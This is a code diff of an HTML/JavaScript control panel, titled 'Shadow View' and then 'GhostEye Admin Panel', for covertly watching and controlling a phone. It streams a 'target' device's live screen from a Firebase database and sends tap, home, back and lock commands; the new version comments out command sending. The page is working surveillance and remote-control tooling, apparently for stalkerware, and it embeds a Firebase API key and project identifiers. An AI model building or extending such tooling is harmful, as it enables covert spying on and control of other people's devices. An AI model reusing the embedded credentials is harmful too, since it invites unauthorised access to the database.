@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shadow View (Auto Connect)</title>
+    <title>GhostEye Admin Panel</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"></script>
 
     <style>
         :root {
@@ -24,137 +24,97 @@
             font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* --- LOGIN OVERLAY (Parent App Style) --- */
-        #loginOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); z-index: 10000;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-        }
-        .login-box {
-            background: #1a1a1a; padding: 30px; border-radius: 15px; border: 1px solid #333;
-            text-align: center; width: 300px;
-        }
-        .login-input {
-            width: 90%; padding: 12px; margin: 20px 0; background: #000; border: 1px solid #444;
-            color: white; border-radius: 5px; font-size: 1.1rem; text-align: center; outline: none;
-        }
-        .login-input:focus { border-color: var(--accent); }
-        .login-btn {
-            background: var(--accent); color: black; padding: 12px 20px; border: none;
-            border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem;
-        }
-
-        /* --- MAIN UI --- */
+        /* --- Header --- */
         .top-nav {
             padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
-            display: flex; justify-content: space-between; align-items: center; z-index: 200;
+            display: flex; justify-content: space-between; align-items: center; z-index: 10;
         }
         .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
         .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
         .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
         .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
 
+        /* --- Main Layout --- */
         .screen-container {
             flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
         }
 
+        /* --- Phone Frame --- */
         .phone-frame {
-            width: 320px; height: 650px; border: 8px solid #222; border-radius: 30px;
+            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
-            z-index: 10;
         }
-
-        #screenStream { 
-            width: 100%; height: 100%; object-fit: contain; 
-            z-index: 1; cursor: crosshair;
-        }
+        #screenStream { width: 100%; height: 100%; object-fit: contain; }
         
-        .offline-msg { 
-            position: absolute; color: #444; text-align: center; 
-            display: flex; flex-direction: column; align-items: center; z-index: 0; 
-        }
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
 
+        /* --- Controls --- */
         .side-panel {
             position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
             background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
-            z-index: 100;
         }
         .control-btn {
             width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
             color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
         }
-        .control-btn:active { transform: scale(0.9); background: var(--accent); color: black; }
-        .logout-btn { border-color: var(--danger); color: var(--danger); }
+        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
+        .control-btn:active { transform: scale(0.9); }
 
+        /* Navigation Bar */
         .nav-bar {
-            width: 100%; height: 60px; background: rgba(0, 0, 0, 0.9);
-            position: absolute; bottom: 0; left: 0; 
-            display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #333;
-            z-index: 9999;
+            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
+            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
         }
-        .nav-item { color: #888; font-size: 1.5rem; cursor: pointer; padding: 15px; width: 100%; text-align: center; }
-        .nav-item:active { color: var(--accent); background: rgba(255,255,255,0.1); }
+        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
+        .nav-item:hover { color: white; }
 
         @media (max-width: 768px) {
-            .top-nav { display: none; }
-            .screen-container { padding: 0; height: 100vh; width: 100vw; background: black; }
-            .phone-frame { width: 100%; height: 100%; border: none; border-radius: 0; box-shadow: none; }
-            .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; }
-            .side-panel { right: 10px; bottom: 100px; background: transparent; border: none; padding: 0; }
-            .hide-on-mobile { display: none !important; }
+            .screen-container { flex-direction: column; }
+            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
+            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
         }
     </style>
 </head>
 <body>
 
-    <div id="loginOverlay">
-        <div class="login-box">
-            <h2 style="color:var(--accent); margin:0;">DEVICE LOGIN</h2>
-            <p style="color:#888; font-size:0.8rem;">Enter Target Device ID</p>
-            <input type="text" id="deviceIdInput" class="login-input" placeholder="e.g. device_12345">
-            <button class="login-btn" onclick="saveAndConnect()">CONNECT</button>
-        </div>
-    </div>
-
     <div class="top-nav">
-        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW VIEW</div>
+        <div class="brand"><i class="fa-solid fa-ghost"></i> GHOST EYE</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">Initializing...</span>
+            <span id="statusText" style="color:#888">System Ready</span>
         </div>
     </div>
 
     <div class="screen-container">
         <div class="phone-frame">
             <div id="offlineMsg" class="offline-msg">
-                <i class="fa-solid fa-satellite-dish fa-2x"></i>
-                <p style="margin-top:10px" id="msgText">Waiting for Video...</p>
+                <i class="fa-solid fa-satellite-dish fa-2x" style="margin-bottom: 10px;"></i>
+                <p id="msgText">Enter Device ID in URL<br>(e.g., ?id=123456)</p>
             </div>
-            
-            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
+            <img id="screenStream" src="" alt="">
             
             <div class="nav-bar">
-                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
-                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
-                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
+                <div class="nav-item" id="btnRecent"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" id="btnHome"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" id="btnBack"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
             </div>
         </div>
 
         <div class="side-panel">
-            <div class="control-btn" onclick="sendCommand('lock')" title="Lock/Unlock"><i class="fa-solid fa-power-off"></i></div>
-            <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_up')" title="Scroll Down"><i class="fa-solid fa-arrow-up"></i></div>
-            <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_down')" title="Scroll Up"><i class="fa-solid fa-arrow-down"></i></div>
-            
-            <div class="control-btn logout-btn" onclick="logout()" title="Change Device ID"><i class="fa-solid fa-right-from-bracket"></i></div>
+            <div class="control-btn" id="btnLock" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
+            <div class="control-btn" id="btnUnlock" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
+            <div class="control-btn" id="btnVolUp" title="Vol +"><i class="fa-solid fa-plus"></i></div>
+            <div class="control-btn" id="btnVolDown" title="Vol -"><i class="fa-solid fa-minus"></i></div>
         </div>
     </div>
 
-    <script>
-        // --------------------------------------------------------------
-        // 🔥 YOUR FIREBASE CONFIG
-        // --------------------------------------------------------------
-        const firebaseConfig = {
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // 👇 MAINE TUMHARI ID YAHA LAGA DI HAI 👇
+       const firebaseConfig = {
             apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
             authDomain: "childapp-ce1fe.firebaseapp.com",
             databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
@@ -164,101 +124,57 @@
             appId: "1:108035285372:android:33bf86d5b727a1a17944f9"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
-        const database = firebase.database();
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-        // --------------------------------------------------------------
-        
-        let currentDeviceId = null;
-        const STORAGE_KEY = 'shadow_device_id'; // Same key for all apps
-        
-        const statusText = document.getElementById('statusText');
-        const offlineMsg = document.getElementById('offlineMsg');
-        const dot = document.getElementById('dot');
-        const img = document.getElementById('screenStream');
-        const loginOverlay = document.getElementById('loginOverlay');
+        // Get ID from URL (?id=123456)
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentDeviceId = urlParams.get('id');
 
-        // 🔥 STEP 1: LOAD SAVED ID
-        window.onload = function() {
-            const savedId = localStorage.getItem(STORAGE_KEY);
+        if (!currentDeviceId) {
+            document.getElementById('statusText').innerText = "ID Missing";
+            document.getElementById('statusText').style.color = "var(--danger)";
+        } else {
+            console.log("Tracking Device:", currentDeviceId);
+            document.getElementById('statusText').innerText = "Connecting...";
 
-            if (savedId) {
-                // ID Found -> Connect directly
-                console.log("Auto-connecting to:", savedId);
-                loginOverlay.style.display = "none";
-                currentDeviceId = savedId;
-                startListening();
-            } else {
-                // No ID -> Show Login Box
-                loginOverlay.style.display = "flex";
-            }
-        };
-
-        // 🔥 STEP 2: SAVE ID AND CONNECT
-        function saveAndConnect() {
-            const inputVal = document.getElementById('deviceIdInput').value.trim();
-            if(inputVal.length > 0) {
-                localStorage.setItem(STORAGE_KEY, inputVal); // Save permanently
-                currentDeviceId = inputVal;
-                loginOverlay.style.display = "none";
-                startListening();
-            } else {
-                alert("Please enter a valid Device ID");
-            }
-        }
-
-        // 🔥 STEP 3: LOGOUT / CHANGE ID
-        function logout() {
-            if(confirm("Change Target Device ID?")) {
-                localStorage.removeItem(STORAGE_KEY);
-                location.reload(); // Refresh to show login box
-            }
-        }
-
-        // --- MAIN LOGIC ---
-        function startListening() {
-            statusText.innerText = "Target: " + currentDeviceId;
+            // 🔥 Image Listener
+            const imageRef = ref(db, 'live_screens/' + currentDeviceId + '/image');
             
-            const screenRef = database.ref("live_screens/" + currentDeviceId + "/image");
-
-            screenRef.on("value", (snapshot) => {
+            onValue(imageRef, (snapshot) => {
                 const base64String = snapshot.val();
-
+                
                 if (base64String) {
-                    img.src = "data:image/jpeg;base64," + base64String;
-                    offlineMsg.style.display = "none";
-                    dot.classList.add("active");
-                    statusText.innerText = "Online: " + currentDeviceId;
-                    statusText.style.color = "var(--accent)";
+                    document.getElementById('offlineMsg').style.display = "none";
+                    document.getElementById('screenStream').src = "data:image/jpeg;base64," + base64String;
+                    
+                    document.getElementById('statusText').innerText = "LIVE: " + currentDeviceId;
+                    document.getElementById('statusText').style.color = "var(--accent)";
+                    document.getElementById('dot').classList.add("active");
                 } else {
-                    dot.classList.remove("active");
-                    // Don't show offline msg immediately to avoid flicker, let user see last frame
+                    console.log("Waiting for data...");
                 }
             }, (error) => {
                 console.error("Firebase Error:", error);
-                statusText.innerText = "Connection Error";
-                statusText.style.color = "red";
+                document.getElementById('msgText').innerText = "Permission Denied\nCheck Database Rules";
             });
         }
 
+        // --- BUTTONS (Abhi sirf Database me command bhejenge) ---
         function sendCommand(action) {
             if(!currentDeviceId) return;
-            database.ref("live_screens/" + currentDeviceId + "/command").set({
-                action: action, timestamp: Date.now()
-            });
+            // set(ref(db, 'live_screens/' + currentDeviceId + '/command'), {
+            //     action: action,
+            //     timestamp: Date.now()
+            // });
+            console.log("Command sent:", action); 
         }
 
-        function sendClick(event) {
-            if(!currentDeviceId) return;
-            const rect = img.getBoundingClientRect();
-            const x = Math.round(event.clientX - rect.left);
-            const y = Math.round(event.clientY - rect.top);
-            database.ref("live_screens/" + currentDeviceId + "/command").set({
-                action: "click", x: x, y: y, timestamp: Date.now()
-            });
-        }
+        document.getElementById('btnRecent').onclick = () => sendCommand('recent');
+        document.getElementById('btnHome').onclick = () => sendCommand('home');
+        document.getElementById('btnBack').onclick = () => sendCommand('back');
+
     </script>
 </body>
 </html>
